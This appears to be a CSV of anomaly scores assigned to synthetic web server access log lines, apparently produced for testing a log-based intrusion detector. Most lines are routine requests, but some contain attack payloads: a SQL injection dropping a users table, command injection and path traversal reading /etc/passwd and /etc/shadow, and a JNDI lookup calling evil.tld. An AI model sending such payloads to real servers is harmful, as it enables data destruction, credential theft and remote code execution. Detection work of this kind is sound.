score_content,score_session,score_fused,score_fused_norm,line
68.55467224121094,,68.55467224121094,68.55467224121094,206.250.187.176 - - [10/Jan/2025:12:00:00 +0100] "HEAD /search?q=monitor HTTP/1.1" 200 18298 "-" "curl/7.85.0"
24.029884338378906,,24.029884338378906,24.029884338378906,123.51.186.156 - - [10/Jan/2025:12:00:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 10161 "-" "Wget/1.21.2 (linux-gnu)"
94.01899719238281,,94.01899719238281,94.01899719238281,169.123.26.189 - - [10/Jan/2025:12:00:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 10330 "https://example.com/" "nikto/2.5.0"
96.52278137207031,,96.52278137207031,96.52278137207031,45.212.159.159 - - [10/Jan/2025:12:00:04 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 3204 "-" "python-requests/2.31.0"
1.9428826570510864,,1.9428826570510864,1.9428826570510864,40.173.159.248 - - [10/Jan/2025:12:00:05 +0100] "GET /contact HTTP/1.1" 200 1046 "-" "curl/7.85.0"
24.07355499267578,,24.07355499267578,24.07355499267578,169.174.40.120 - - [10/Jan/2025:12:00:06 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 17291 "https://example.com/" "python-requests/2.31.0"
124.94534301757812,,124.94534301757812,124.94534301757812,53.172.215.182 - - [10/Jan/2025:12:00:08 +0100] "TRACE /search?q=headphones HTTP/1.1" 204 5218 "-" "python-requests/2.31.0"
51.54461669921875,,51.54461669921875,51.54461669921875,113.254.115.241 - - [10/Jan/2025:12:00:09 +0100] "DELETE /api/product?id=123 HTTP/1.1" 304 17167 "https://example.com/" "dirb/2.22"
93.92975616455078,,93.92975616455078,93.92975616455078,51.35.94.36 - - [10/Jan/2025:12:00:10 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 6381 "https://example.com/" "python-requests/2.31.0"
0.22786372900009155,,0.22786372900009155,0.22786372900009155,4.188.252.184 - - [10/Jan/2025:12:00:13 +0100] "GET /assets/app.css HTTP/1.1" 204 2197 "-" "sqlmap/1.7.2#stable"
34.82796859741211,,34.82796859741211,34.82796859741211,52.195.121.210 - - [10/Jan/2025:12:00:14 +0100] "PUT /search?q=headphones HTTP/1.1" 200 12702 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.52067565917969,,46.52067565917969,46.52067565917969,46.247.192.214 - - [10/Jan/2025:12:00:15 +0100] "HEAD /profile HTTP/1.1" 200 13830 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
93.8655014038086,,93.8655014038086,93.8655014038086,134.135.242.146 - - [10/Jan/2025:12:00:18 +0100] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 6158 "-" "sqlmap/1.7.2#stable"
26.68988800048828,,26.68988800048828,26.68988800048828,145.18.128.181 - - [10/Jan/2025:12:00:18 +0100] "POST /search?q=ssd HTTP/1.1" 200 10108 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
34.894798278808594,,34.894798278808594,34.894798278808594,249.44.188.226 - - [10/Jan/2025:12:00:20 +0100] "PUT /search?q=monitor HTTP/1.1" 200 16445 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
125.07061004638672,,125.07061004638672,125.07061004638672,245.76.94.181 - - [10/Jan/2025:12:00:20 +0100] "TRACE /search?q=laptop HTTP/1.1" 200 17527 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.02204704284668,,24.02204704284668,24.02204704284668,126.206.123.64 - - [10/Jan/2025:12:00:22 +0100] "GET /search?q=phone HTTP/1.1" 200 2185 "https://twitter.com/" "dirb/2.22"
1.9601778984069824,,1.9601778984069824,1.9601778984069824,126.99.228.236 - - [10/Jan/2025:12:00:22 +0100] "GET /contact HTTP/1.1" 200 7604 "https://www.google.com/" "python-requests/2.31.0"
48.91822814941406,,48.91822814941406,48.91822814941406,177.172.68.127 - - [10/Jan/2025:12:00:22 +0100] "DELETE /search?q=phone HTTP/1.1" 200 17093 "https://example.com/" "sqlmap/1.7.2#stable"
26.814247131347656,,26.814247131347656,26.814247131347656,170.160.60.153 - - [10/Jan/2025:12:00:24 +0100] "DELETE /profile HTTP/1.1" 200 10607 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
93.9334487915039,,93.9334487915039,93.9334487915039,131.167.149.134 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4633 "-" "nikto/2.5.0"
94.05518341064453,,94.05518341064453,94.05518341064453,199.52.180.132 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17002 "https://www.google.com/" "dirb/2.22"
4.5467000007629395,,4.5467000007629395,4.5467000007629395,162.105.144.160 - - [10/Jan/2025:12:00:30 +0100] "POST /contact HTTP/1.1" 200 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30168.04296875,,30168.04296875,30168.04296875,217.67.130.155 - - [10/Jan/2025:12:00:31 +0100] "HEAD /wp-login.php HTTP/1.1" 404 1014 "https://twitter.com/" "curl/7.85.0"
